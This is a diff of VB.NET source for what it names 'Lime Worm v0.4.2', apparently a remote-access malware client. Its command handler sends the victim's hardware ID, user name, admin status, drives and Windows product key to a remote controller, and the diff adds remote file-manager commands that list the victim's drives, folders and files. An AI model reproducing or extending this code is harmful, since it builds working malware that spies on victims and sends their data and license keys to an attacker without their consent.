@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./18/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./20/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.4.1 ..                   ##
+'##                     .. Lime Worm v0.4.2 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -183,7 +183,18 @@ Public Class Main
                     DEC.BeforeDec()
 
                 Case "Details"
-                    C.Send("Details" + SPL + ID.HWID + SPL + ID.UserName + SPL + Reflection.Assembly.GetExecutingAssembly.Location + SPL + ID.CPU + SPL + ID.GPU + SPL + ID.AmiAdmin + SPL + ID.MachineType + SPL + DateAndTime.Now + SPL + ID.ListDrivers + SPL + ID.LastReboot + SPL + TCP.MainHOST + " @ " + Settings.PORT.ToString + SPL + ID.MyOS + " " + ID.Bit + SPL + ID.WinKey)
+                    C.Send("Details" + SPL + ID.Getsystem)
+
+                Case "Drivers"
+                    C.Send("FM" & SPL & FMDrives())
+                Case "FM"
+                    Try
+                        C.Send("FM" & SPL & FMFolders(A(1)) & FMFiles(A(1)))
+                    Catch
+                        C.Send("FM" & SPL & "Error")
+                    End Try
+                Case "OFM"
+                    C.Send("OFM")
 
             End Select
         Catch ex As Exception
